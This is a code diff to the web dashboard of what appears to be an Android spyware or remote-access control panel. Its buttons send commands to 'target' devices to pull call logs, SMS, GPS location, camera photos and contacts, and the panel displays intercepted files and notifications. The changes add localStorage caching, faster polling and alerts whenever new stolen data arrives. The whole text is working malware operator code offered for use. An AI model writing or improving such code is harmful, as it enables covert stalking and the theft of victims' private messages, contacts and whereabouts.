@@ -285,6 +285,14 @@
     </div>
 
     <script>
+        // Data stores
+        let localData = {
+            devices: JSON.parse(localStorage.getItem('nexus_devices')) || [],
+            files: JSON.parse(localStorage.getItem('nexus_files')) || [],
+            notifications: JSON.parse(localStorage.getItem('nexus_notifications')) || [],
+            locations: JSON.parse(localStorage.getItem('nexus_locations')) || []
+        };
+
         function showToast(message) {
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
@@ -342,6 +350,61 @@
             return new Date(ms).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
         }
 
+        function renderData() {
+            // Render Devices
+            const devContainer = document.getElementById('deviceList');
+            if (localData.devices.length === 0) {
+                devContainer.innerHTML = `<div class="empty-state"><i class="fa-solid fa-mobile-screen"></i><p>No devices currently online</p></div>`;
+            } else {
+                devContainer.innerHTML = localData.devices.map(d => `
+                    <div class="device-item">
+                        <div class="device-info">
+                            <div>
+                                <span class="status-dot"></span>
+                                <span class="device-name">${d.name}</span>
+                            </div>
+                            <span class="device-id">${d.id.substring(0,8)}...</span>
+                        </div>
+                        <div class="action-grid">
+                            <div class="btn-action" onclick="sendCommand('${d.id}', 'ch')"><i class="fa-solid fa-phone-flip"></i> Call Logs</div>
+                            <div class="btn-action" onclick="sendCommand('${d.id}', 'as')"><i class="fa-solid fa-comments"></i> In/Out SMS</div>
+                            <div class="btn-action" onclick="sendCommand('${d.id}', 'loc')"><i class="fa-solid fa-location-crosshairs"></i> Get GPS</div>
+                            <div class="btn-action" onclick="sendCommand('${d.id}', 'cf')"><i class="fa-solid fa-camera"></i> Snap Photo</div>
+                            <div class="btn-action" onclick="promptSms('${d.id}')"><i class="fa-solid fa-paper-plane"></i> Send SMS</div>
+                            <div class="btn-action" onclick="sendCommand('${d.id}', 'contact')"><i class="fa-solid fa-address-book"></i> Contacts</div>
+                        </div>
+                    </div>
+                `).join('');
+            }
+
+            // Render Files
+            document.getElementById('filesList').innerHTML = localData.files.length ? localData.files.map(f => `
+                <div class="list-item">
+                    <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(f.timestamp)}</span> <span>${f.deviceName || ''}</span></div>
+                    <div class="item-content"><i class="fa-solid fa-download"></i> <a href="${f.url}" target="_blank">${f.originalname}</a></div>
+                </div>
+            `).join('') : `<div class="empty-state"><i class="fa-solid fa-folder-open"></i><p>No captured files yet</p></div>`;
+
+            // Render Notifications
+            document.getElementById('notificationsList').innerHTML = localData.notifications.length ? localData.notifications.map(n => `
+                <div class="list-item">
+                    <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(n.timestamp)}</span> <span>${n.deviceName || ''}</span></div>
+                    <div class="item-content">${n.text.replace(/\\n/g, '<br>')}</div>
+                </div>
+            `).join('') : `<div class="empty-state"><i class="fa-solid fa-bell-slash"></i><p>No notifications intercepted</p></div>`;
+
+            // Render Locations
+            document.getElementById('locationsList').innerHTML = localData.locations.length ? localData.locations.map(l => `
+                <div class="list-item">
+                    <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(l.timestamp)}</span> <span>${l.deviceName || ''}</span></div>
+                    <div class="item-content">
+                        <i class="fa-solid fa-map-location-dot" style="color:var(--primary-color)"></i> 
+                        <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">View on Google Maps</a>
+                    </div>
+                </div>
+            `).join('') : `<div class="empty-state"><i class="fa-solid fa-location-arrow"></i><p>No GPS data captured</p></div>`;
+        }
+
         async function fetchData(btn = null) {
             if(btn) {
                 const icon = btn.querySelector('i');
@@ -350,81 +413,59 @@
             }
 
             try {
-                // Fetch Devices
-                const devRes = await fetch('/admin/devices');
-                const devices = await devRes.json();
-                const devContainer = document.getElementById('deviceList');
-                if (devices.length === 0) {
-                    devContainer.innerHTML = `<div class="empty-state"><i class="fa-solid fa-mobile-screen"></i><p>No devices currently online</p></div>`;
-                } else {
-                    devContainer.innerHTML = devices.map(d => `
-                        <div class="device-item">
-                            <div class="device-info">
-                                <div>
-                                    <span class="status-dot"></span>
-                                    <span class="device-name">${d.name}</span>
-                                </div>
-                                <span class="device-id">${d.id.substring(0,8)}...</span>
-                            </div>
-                            <div class="action-grid">
-                                <div class="btn-action" onclick="sendCommand('${d.id}', 'ch')">
-                                    <i class="fa-solid fa-phone-flip"></i> Call Logs
-                                </div>
-                                <div class="btn-action" onclick="sendCommand('${d.id}', 'as')">
-                                    <i class="fa-solid fa-comments"></i> In/Out SMS
-                                </div>
-                                <div class="btn-action" onclick="sendCommand('${d.id}', 'loc')">
-                                    <i class="fa-solid fa-location-crosshairs"></i> Get GPS
-                                </div>
-                                <div class="btn-action" onclick="sendCommand('${d.id}', 'cf')">
-                                    <i class="fa-solid fa-camera"></i> Snap Photo
-                                </div>
-                                <div class="btn-action" onclick="promptSms('${d.id}')">
-                                    <i class="fa-solid fa-paper-plane"></i> Send SMS
-                                </div>
-                                <div class="btn-action" onclick="sendCommand('${d.id}', 'contact')">
-                                    <i class="fa-solid fa-address-book"></i> Contacts
-                                </div>
-                            </div>
-                        </div>
-                    `).join('');
+                const [devRes, filesRes, notifRes, locRes] = await Promise.all([
+                    fetch('/admin/devices').catch(()=>null), 
+                    fetch('/admin/files').catch(()=>null), 
+                    fetch('/admin/notifications').catch(()=>null), 
+                    fetch('/admin/locations').catch(()=>null)
+                ]);
+
+                if(devRes) localData.devices = await devRes.json();
+                
+                if(filesRes) {
+                    const newFiles = await filesRes.json();
+                    if (newFiles.length > localData.files.length) {
+                        triggerAndroidNotification("New File Downloaded", "A new intercepted file is ready to view.");
+                    }
+                    localData.files = newFiles;
                 }
 
-                // Fetch Files
-                const filesRes = await fetch('/admin/files');
-                const files = await filesRes.json();
-                document.getElementById('filesList').innerHTML = files.length ? files.map(f => `
-                    <div class="list-item">
-                        <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(f.timestamp)}</span> <span>${f.deviceName}</span></div>
-                        <div class="item-content"><i class="fa-solid fa-download"></i> <a href="${f.url}" target="_blank">${f.originalname}</a></div>
-                    </div>
-                `).join('') : `<div class="empty-state"><i class="fa-solid fa-folder-open"></i><p>No captured files yet</p></div>`;
+                if(notifRes) {
+                    const newNotifications = await notifRes.json();
+                    if (newNotifications.length > localData.notifications.length) {
+                        triggerAndroidNotification("New Alert", "A new notification was intercepted from target!");
+                    }
+                    localData.notifications = newNotifications;
+                }
 
-                // Fetch Notifications
-                const notifRes = await fetch('/admin/notifications');
-                const notifications = await notifRes.json();
-                document.getElementById('notificationsList').innerHTML = notifications.length ? notifications.map(n => `
-                    <div class="list-item">
-                        <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(n.timestamp)}</span> <span>${n.deviceName}</span></div>
-                        <div class="item-content">${n.text.replace(/\\n/g, '<br>')}</div>
-                    </div>
-                `).join('') : `<div class="empty-state"><i class="fa-solid fa-bell-slash"></i><p>No notifications intercepted</p></div>`;
+                if(locRes) {
+                    const newLocations = await locRes.json();
+                    if (newLocations.length > localData.locations.length) {
+                        triggerAndroidNotification("Location Update", "A GPS coordinate was successfully retrieved.");
+                    }
+                    localData.locations = newLocations;
+                }
 
-                // Fetch Locations
-                const locRes = await fetch('/admin/locations');
-                const locations = await locRes.json();
-                document.getElementById('locationsList').innerHTML = locations.length ? locations.map(l => `
-                    <div class="list-item">
-                        <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(l.timestamp)}</span> <span>${l.deviceName}</span></div>
-                        <div class="item-content">
-                            <i class="fa-solid fa-map-location-dot" style="color:var(--primary-color)"></i> 
-                            <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">View on Google Maps</a>
-                        </div>
-                    </div>
-                `).join('') : `<div class="empty-state"><i class="fa-solid fa-location-arrow"></i><p>No GPS data captured</p></div>`;
+                // Save to local storage for offline memory
+                localStorage.setItem('nexus_devices', JSON.stringify(localData.devices));
+                localStorage.setItem('nexus_files', JSON.stringify(localData.files));
+                localStorage.setItem('nexus_notifications', JSON.stringify(localData.notifications));
+                localStorage.setItem('nexus_locations', JSON.stringify(localData.locations));
+
+                // Re-render UI
+                renderData();
 
             } catch (e) {
                 console.error("Fetch Error:", e);
+            }
+        }
+
+        function triggerAndroidNotification(title, msg) {
+            if (window.Android && typeof window.Android.showNotification === 'function') {
+                window.Android.showNotification(title, msg);
+            } else {
+                // Not in android wrapper, browser alternative
+                showToast(title + ": " + msg);
             }
         }
 
@@ -436,9 +477,13 @@
             document.getElementById(tabId + 'List').classList.remove('hidden');
         }
 
-        // Initialize
+        // Initialize from local storage instantly
+        renderData();
+        // Fetch new data
         fetchData();
-        setInterval(() => fetchData(), 10000); // 10s auto refresh
+        
+        // Auto refresh
+        setInterval(() => fetchData(), 7000); 
     </script>
 </body>
 </html>
